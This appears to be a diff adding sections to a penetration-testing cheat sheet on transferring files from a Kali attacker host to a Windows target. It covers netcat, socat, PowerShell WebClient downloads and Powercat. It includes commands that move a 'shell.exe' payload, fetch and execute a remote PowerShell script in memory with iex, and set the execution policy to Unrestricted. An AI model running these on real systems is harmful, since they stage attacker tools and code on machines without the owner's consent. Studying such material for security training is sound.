@@ -58,3 +58,67 @@ sudo nano /etc/vsftpd.conf
 
 => anonymous_enable=YES
 ```
+
+## Netcat
+
+### Kali machine
+
+``` bash
+nc -nvlp 4444 < /usr/share/windows-resources/binaries/wget.exe
+```
+
+### Windows machine
+
+``` bash
+nc -nv 192.168.11.130 4444 > wget.exe
+```
+
+## Socat
+
+### Kali machine
+
+``` bash
+sudo socat TCP4-LISTEN:443,fork file:shell.exe
+```
+
+### Windows machine
+
+``` bash
+socat TCP4:192.168.11.130:443 file:shell.exe,create
+```
+
+## PowerShell
+
+### Kali machine
+
+``` bash
+sudo python3 -m http.server 80
+```
+
+### Windows machine
+
+``` bash
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.11.130/wget.exe','C:\Users\Public\Desktop\wget.exe')"
+```
+
+## Powercat
+
+``` powershell
+Set-ExecutionPolicy Unrestricted
+
+iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+
+. .\powercat.ps1
+```
+
+### Kali machine
+
+``` bash
+sudo nc -lnvp 443 > powercat.ps1
+```
+
+### Windows machine
+
+``` bash
+powercat -c 192.168.11.130 -p 443 -i C:\Users\Public\powercat.ps1
+```
